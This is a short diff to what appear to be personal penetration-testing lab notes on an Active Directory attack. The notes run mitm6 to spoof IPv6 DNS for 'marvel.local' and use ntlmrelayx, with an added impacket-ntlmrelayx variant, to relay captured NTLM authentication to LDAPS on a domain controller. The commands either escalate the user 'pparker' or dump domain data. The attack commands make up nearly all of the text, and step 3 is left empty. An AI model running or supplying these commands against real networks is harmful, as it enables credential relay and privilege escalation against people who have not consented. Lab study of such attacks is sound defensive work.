@@ -7,5 +7,5 @@ If mitm6 not yet installed
 How to initiate the attack?
 
 1. Prepare the command `sudo mitm6 -d marvel.local`. Do not yet execute it as we will run ntlmrelayx first.
-2. Execute `ntlmrelayx 6 -t ldaps://192.168.64.250 -wh fakewpad.marvel.local -escalate-user pparker`
+2. Execute `ntlmrelayx 6 -t ldaps://192.168.64.250 -wh fakewpad.marvel.local -escalate-user pparker` or `impacket-ntlmrelayx -6 -t ldaps://192.168.64.250 -wh fakewpad.marvel.local -l lootme`
 3. 
